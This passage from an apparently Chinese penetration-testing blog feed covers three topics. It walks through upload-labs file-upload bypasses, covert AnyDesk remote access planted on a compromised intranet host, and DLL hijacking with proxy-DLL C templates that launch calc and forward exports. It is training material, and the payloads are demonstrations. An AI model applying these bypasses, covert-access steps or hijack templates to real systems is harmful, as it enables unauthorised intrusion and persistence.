class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>];<br>        <span class="hljs-variable">$file_ext</span> = pathinfo(<span class="hljs-variable">$file_name</span>,PATHINFO_EXTENSION);<br><br>        <span class="hljs-keyword">if</span>(!in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123; <br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;禁止保存为该类型文件！&#x27;</span>;<br>        &#125;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>采用了黑名单的限制，大小写混写可绕过<br><img src="https://img-blog.csdnimg.cn/20210616124733276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>Pass-20</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span>(!empty(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>]))&#123;<br>    //检查MIME<br>    <span class="hljs-variable">$allow_type</span> = array(<span class="hljs-string">&#x27;image/jpeg&#x27;</span>,<span class="hljs-string">&#x27;image/png&#x27;</span>,<span class="hljs-string">&#x27;image/gif&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(!in_array(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>],<span class="hljs-variable">$allow_type</span>))&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;禁止上传该类型文件!&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        //检查文件名<br>        <span class="hljs-variable">$file</span> = empty(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>]) ? <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>] : <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (!is_array(<span class="hljs-variable">$file</span>)) &#123;<br>            <span class="hljs-variable">$file</span> = explode(<span class="hljs-string">&#x27;.&#x27;</span>, strtolower(<span class="hljs-variable">$file</span>));<br>        &#125;<br><br>        <span class="hljs-variable">$ext</span> = end(<span class="hljs-variable">$file</span>);<br>        <span class="hljs-variable">$allow_suffix</span> = array(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$allow_suffix</span>)) &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;禁止上传该后缀文件!&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$file_name</span> = reset(<span class="hljs-variable">$file</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$file</span>[count(<span class="hljs-variable">$file</span>) - 1];<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件上传成功！&quot;</span>;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件上传失败！&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;请选择要上传的文件！&quot;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>1.首先会对mime进行检测，所以要上传图片的mime<br>2.检查save_name是否为空,如果为空就用文件名赋值给$file,否则用save_name<br>3.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> (!is_array(<span class="hljs-variable">$file</span>)) &#123;<br>           <span class="hljs-variable">$file</span> = explode(<span class="hljs-string">&#x27;.&#x27;</span>, strtolower(<span class="hljs-variable">$file</span>));<br>       &#125;<br></code></pre></td></tr></table></figure><p>判断是否为数组，如果不是数据就以”.”拆分为数组<br>4.判断后缀是否是白名单的.jpg、.png、.gif</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$ext</span> = end(<span class="hljs-variable">$file</span>);<br>       <span class="hljs-variable">$allow_suffix</span> = array(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>       <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$allow_suffix</span>))<br></code></pre></td></tr></table></figure><p>5.一切都过了之后就是文件重命名了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$file_name</span> = reset(<span class="hljs-variable">$file</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$file</span>[count(<span class="hljs-variable">$file</span>) - 1];<br></code></pre></td></tr></table></figure><p>取数组第一个为文件名，取数组倒数第二个为文件后缀</p><p>绕过步骤：<br><img src="https://img-blog.csdnimg.cn/20210616133014764.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>upload&#x2F;upload.php.后面多个.但是windows环境下.会被默认去掉</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>未开启3389实现远程桌面</title>
    <link href="/2022/06/15/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/"/>
    <url>/2022/06/15/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/</url>
    
    <content type="html"><![CDATA[<p>在内网渗透时如果目标没有开启3389，或者通过某种手段给禁用掉了。此时我们就可以通过今天介绍的工具进行远程连接。<br><strong>项目地址</strong><br><a href="https://download.anydesk.com/AnyDesk.exe">https://download.anydesk.com/AnyDesk.exe</a><br>打开应用<br><img src="https://img-blog.csdnimg.cn/55b1566a5305416691b7262b26a99ddc.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/c02a6cb238ff42feb1898611a194f2c4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>设置连接的用户名和密码</p><p>退出本地的AnyDesk,然后到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">c:\Users\&#123;USER&#125;\AppData\Roaming\AnyDesk    目录下将<br>ad.trace、service.conf、system.conf、user.conf<br>这个<span class="hljs-number">4</span>个文件上传到目标的c:\Users\&#123;目标在线的用户&#125;\AppData\Roaming\AnyDesk目录下。<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/92e45b4085a949b5b7c65244888a459f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将AnyDesk也上传到目标服务器（任意目录都行，最好修改一下文件名）。然后以在线的那个用户的权限去执行AnyDesk这个程序。最后删除本机的前四个文件配置文件（不删除就相当于有两个一样的地址，就不知道是连接的谁），启动本机的AnyDesk输入一开始你AnyDesk的连接地址，连接成功后输入前面设置的密码即可。<br><img src="https://img-blog.csdnimg.cn/8d9ae2cba61d4ac194b4ba0f498d349a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/a22cdc148d954d018bd4ce9564d8516b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功连接</p><p>参考：<a href="https://mp.weixin.qq.com/s/QgCQQMVLGzSIjP-sroiMDw">https://mp.weixin.qq.com/s/QgCQQMVLGzSIjP-sroiMDw</a></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>3389</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dll劫持</title>
    <link href="/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/"/>
    <url>/2022/06/15/dll%E5%8A%AB%E6%8C%81/dll%E5%8A%AB%E6%8C%81/</url>
    
    <content type="html"><![CDATA[<h2 id="dll是什么"><a href="#dll是什么" class="headerlink" title="dll是什么"></a>dll是什么</h2><p>dll为动态链接库文件，又称”应用程序拓展”，是软件文件类型。在Windows中许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库文件，即dll文件，放置于系统中，个人理解类似于我们编程中引入的模块。<br><img src="https://img-blog.csdnimg.cn/84a6ea0d511a4d92a0eddbed77137193.png" alt="在这里插入图片描述"></p><ul><li><p><strong>静态编译</strong>:debug状态下：MTd release状态下：MT</p></li><li><p><strong>动态编译</strong>:debug状态下：MDd release状态下：MD</p><p>  动态编译的生成的可执行文件的exe小，但是运行需要系统环境具有相关的dll和lib文件，就是动态调用系统相关的文件才能运行；</p><p>  静态编译生成的可执行文件exe大，但是运行的时候不依赖于系统环境所依赖的dll和lib等环境问题，在编译的时候已经这些dll相关文件编译进了exe文件，所以exe文件较大。所以需要自己创建的工程需要在别的电脑上运行，考虑到稳定性，同时对执行文件的大小没有要求的话还是尽量选择静态编译。</p></li></ul><h2 id="dll劫持漏洞原理"><a href="#dll劫持漏洞原理" class="headerlink" title="dll劫持漏洞原理"></a>dll劫持漏洞原理</h2><p>如果在一个进程加载dll时没有指定dll的绝对路径，那么windows会尝试去按照顺序搜索这些特定目录来查找这个dll。如果攻击者将恶意的dll放在优先于正常dll所在目录，那么就能够欺骗系统去加载恶意的dll,形成dll劫持。</p><h2 id="DLL路径搜索目录顺序"><a href="#DLL路径搜索目录顺序" class="headerlink" title="DLL路径搜索目录顺序"></a>DLL路径搜索目录顺序</h2><ul><li>程序加载目录</li><li>系统目录。使用GetSystemDirectory获取该路径</li><li>16位系统目录</li><li>windows目录，使用GetWindowsDirectory获取该路径</li><li>windows当前目录</li><li>PATH环境变量中列出的目录</li></ul><h2 id="Know-Dlls注册表项"><a href="#Know-Dlls注册表项" class="headerlink" title="Know Dlls注册表项"></a>Know Dlls注册表项</h2><p>从windows7之后，微软为了更进一步的防御系统的dll劫持，将一些容易被劫持的系统dll写进了一个注册表项中，那么凡是在此项目下的dll文件就会被禁止从exe自身所在目录下调用，而只能从系统目录即system32目录下调用</p><ul><li><strong>默认情况下：</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode<br></code></pre></td></tr></table></figure><p>处于开启状态，如果手动设置为0，关闭该安全选项，搜索顺序为：在以上顺序的基础上，将 当前目录   修改至    系统目录   的位置，其他顺移。</p><p>另外当前应用程序加载dll时如果仅指定dll名称时，那么将按照以上顺序搜索dll文件，不过在加载之前还需要满足以下两条规范：<br>1.当内存中已加载相同模块名称的dll时，系统将直接夹在该dll,不会进行搜索，除非设置了dll重定向选项<br>2.如果要加载的dll模块属于known dlls，系统直接加载系统目录下的该dll，不会进行搜索</p><p>windows操作系统通过”dll路径搜索目录顺序”和“known dlls注册表项”来确定应用程序所要调用的dll的路径，当一个进程尝试加载一个dll的时候，会先尝试搜索程序所处的目录，若还没有找到，则向下搜索16位系统目录即system目录，然后windows目录，当前目录，path环境变量的各个目录。<br><img src="https://img-blog.csdnimg.cn/938cfcaba02747eea3a3a77feba8b42f.png" alt="在这里插入图片描述"><br>这样的加载顺序很容易就会导致一个系统的dll被劫持，只要攻击者将目标文件和恶意dll放在一起即可导致恶意dll搜索顺序优先于系统dll目录加载，就能够欺骗系统去加载恶意的dll，形成”dll劫持”。</p><h2 id="手动劫持"><a href="#手动劫持" class="headerlink" title="手动劫持"></a>手动劫持</h2><ul><li><strong>劫持程序运行时加载的未知dll</strong><br>用到的工具 Process Monitor v3.60<br>通过process monitor监控dll调用是一种最基础的寻找dll劫持的方式<br>设置过滤规则:(默认的不需要改变)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Path ends with .dll<br>Result is NAME NOT FOUND<br>Process Name contains 进程名称<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/aea43644cc5e421180df2220e6e9cc06.png" alt="在这里插入图片描述"><br>然后这里找到一个需要用到loadlibrary这个api的dll，这里找有个api的原因是因为如果该dll的调用栈中存在有 **loadlibrary(Ex) * *,说明这个dll被进程所动态加载的。如果这种利用场景下，伪造的dll文件不需要存在任何导出函数即可被成功加载，即使加载后进程内部出错，也是在dll被加载成功加载之后的事情。<br>loadlibrary和loadlibraryex是一个本地加载，一个是远程加载，如果dll不在调用的同一目录下，就可以使用loadlibrary(L”DLL绝对路径”)加载。但是如果DLL内部又调用一个DLL，就需要使用loadlibraryex进行远程加载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">LoadLibraryEx(“DLL绝对路径”, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);<br></code></pre></td></tr></table></figure><p>LoadLibraryEx的最后一个参数设置为load_With_altered_Search_path即可让系统dll搜索顺序从我们设置的目录开始</p><p>找到可以被劫持的dll文件<br><img src="https://img-blog.csdnimg.cn/2f08b624d5e24e89be3acd1bd7a35911.png" alt="在这里插入图片描述"><br>编写恶意的dll</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">// dllmain.cpp : 定义 DLL 应用程序的入口点。<br><span class="hljs-comment">#include &quot;pch.h&quot;</span><br><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br><br>BOOL APIENTRY DllMain( HMODULE hModule,<br>                       DWORD  ul_reason_for_call,<br>                       LPVOID lpReserved<br>                     )<br>&#123;<br>    switch (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>    system(<span class="hljs-string">&quot;calc&quot;</span>);<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-built_in">break</span>;<br>    &#125;<br>    <span class="hljs-built_in">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>用vs创建dll项目，并生成<br><img src="https://img-blog.csdnimg.cn/95c180c0a7e9420d88e3ae49756b7d71.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b4991efb66e341f69fb2ef8df9dc0401.png" alt="在这里插入图片描述"></p><ul><li><strong>劫持程序某个功能调用的dll文件</strong><br>某个exe程序运行的时候，监控某个功能(例如截图)所调用的dll文件<br>1.使用CFFExplorer工具查看该文件(dll文件名为B)，导出目录里的kerbel32.dll里是否调用了LoadLibrary<br>2.如果调用了LoadLibrary,则在导出目录找导出的函数名(函数名为C)<br>3.自己编写dll，重命名为B.dll，将原先的B.dll重命名为B_origin.dll。B.dll代码里用LoadLibrary调用B_origin.dll<br>4.运行该程序的某个功能，即可劫持</li></ul><p>代码demo<br>extern导出函数的代码可以用rundll32 dllExtern.dll   test(函数名)  调用extern “C” extern “C”使得在C++中使用c编译方式成为可能。在c++下定义c函数，需要加extern “C”关键字。用extern “C”来指明该函数使用c编译方式。输出的”c”函数可以从”c”代码里调用<br>__declspec(dllexport)的作用就是让编译器按照某种预定的方式来输出导出函数及变量的符号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">动态链接库文件中包含若干公用的代码、数据库等。供其他模块使用。动态链接库是将应用程序模块化的重要方法、动态链接库中的函数和数据可以同时供其他多个可执行文件使用，不同的可执行文件可以调用同一个动态链接库中的函数。DLL中函数经过<span class="hljs-string">&quot;导出&quot;</span>后可以被exe文件中的程序调用<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#include &lt;Windows.h&gt; // 这是导出变量的一个示例 </span><br>extern <span class="hljs-string">&quot;C&quot;</span> _declspec(dllexport) void __cdecl <span class="hljs-built_in">test</span>(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine,int nCmdShow) <br>&#123;<br> WinExec(<span class="hljs-string">&quot;calc.exe&quot;</span>, SW_HIDE);<br>  <span class="hljs-built_in">return</span>; <br>  &#125;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/a2c14fe8e5c04aa4b9bf9a99fab63887.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#劫持dll的代码模板</span><br><span class="hljs-comment">#假设程序加载的dll名字为B，B.dll的导出函数为C</span><br><span class="hljs-comment">#劫持的dll名字改为B</span><br><span class="hljs-comment">#B.dll改为B_Origin.dll</span><br><span class="hljs-comment">#PrScrn改为C</span><br><span class="hljs-comment">#PrScrn_Origial.dll改为B_Origin.dll</span><br><span class="hljs-comment">#include &lt;Windows.h&gt;</span><br>extern <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) void PrScrn();<br>BOOL APIENTRY DllMain( HMODULE hModule,<br>                       DWORD  ul_reason_for_call,<br>                       LPVOID lpReserved<br>                     )<br>&#123;<br>    switch (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        WinExec(<span class="hljs-string">&quot;calc.exe&quot;</span>, SW_HIDE);            //我们要攻击的恶意代码<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-built_in">break</span>;<br>    &#125;<br>    <span class="hljs-built_in">return</span> TRUE;<br>&#125;<br>void <span class="hljs-function"><span class="hljs-title">PrScrn</span></span>()<br>&#123;<br>    MessageBox(NULL, L<span class="hljs-string">&quot;DLL Hijack! by DLLHijacker!&quot;</span>, L<span class="hljs-string">&quot;:)&quot;</span>, 0);  //我们要攻击的恶意代码<br>    HINSTANCE hDllInst = LoadLibrary(L<span class="hljs-string">&quot;PrScrn_Origial.dll&quot;</span>);<br>    <span class="hljs-keyword">if</span> (hDllInst)<br>    &#123;<br>        typedef DWORD(WINAPI *EXPFUNC)();<br>        EXPFUNC exportFunc = NULL;<br>        exportFunc = (EXPFUNC)GetProcAddress(hDllInst, <span class="hljs-string">&quot;PrScrn&quot;</span>);<br>        <span class="hljs-keyword">if</span> (exportFunc)<br>        &#123;<br>            exportFunc();<br>        &#125;<br>        FreeLibrary(hDllInst);<br>    &#125;<br>    <span class="hljs-built_in">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>实验：<br>process monitor做以下规则</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Path ends with .dll<br>Result is SUCCESS<br>Process Name contains 进程名称<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/7cc770d23ebb43269332dd94069070a9.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/d37c165f0a2440a0a56519e0a0ea83c7.png" alt="在这里插入图片描述"><br>使用CFFExplorer查看目标dll文件<br><img src="https://img-blog.csdnimg.cn/d1bb8e4a1c444da793a6b5536abb6792.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2c991ae12b9a433fb0146b41e3846d36.png" alt="在这里插入图片描述"><br>任选一个函数(存在LoadLibraryExW的dll文件的导出目录如果是多个函数，每个函数都可以劫持！)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#include &lt;Windows.h&gt;</span><br><span class="hljs-comment">#include &quot;pch.h&quot;</span><br>extern <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) void beNotified();<br>BOOL APIENTRY DllMain(<br>HMODULE hModule,<br>DWORD ul_reason_for_call,<br>LPVOID lpReserved<br>) &#123;<br>switch (ul_reason_for_call) &#123;<br><span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>WinExec(<span class="hljs-string">&quot;calc.exe&quot;</span>, SW_HIDE); //我们要攻击的恶意代码 <br><span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br><span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br><span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br><span class="hljs-built_in">break</span>;<br>&#125;<br><span class="hljs-built_in">return</span> TRUE;<br>&#125;<br>void <span class="hljs-function"><span class="hljs-title">beNotified</span></span>() &#123;<br>MessageBox(NULL, L<span class="hljs-string">&quot;DLL Hijack! by DLLHijacker!&quot;</span>, L<span class="hljs-string">&quot;:)&quot;</span>, 0); //我们要攻击的恶意代码 <br>HINSTANCE hDllInst = LoadLibrary(L<span class="hljs-string">&quot;NppCoverter_Origial.dll&quot;</span>);<br><span class="hljs-keyword">if</span> (hDllInst) &#123;<br>typedef DWORD(WINAPI *EXPFUNC)();<br>EXPFUNC exportFunc = NULL;<br>exportFunc = (EXPFUNC)GetProcAddress(hDllInst, <span class="hljs-string">&quot;beNotified&quot;</span>);<br><span class="hljs-keyword">if</span> (exportFunc) &#123;<br>exportFunc();<br>&#125;<br>FreeLibrary(hDllInst);<br>&#125;<br><span class="hljs-built_in">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d574cfc0391940029887e151f196b9f8.png" alt="在这里插入图片描述"></p><p>将编译好的文件放到目标dll同目录下，并且重命名为NppCoverter.dll。原先的NppCoverter.dll重命名为NppCoverter_Origial.dll</p><p><img src="https://img-blog.csdnimg.cn/a43eb1f9a29545a5984d8db68db662b5.png" alt="在这里插入图片描述"><br>执行程序<br><img src="https://img-blog.csdnimg.cn/6ed66f14a05d46d3b903a798a6f76359.png" 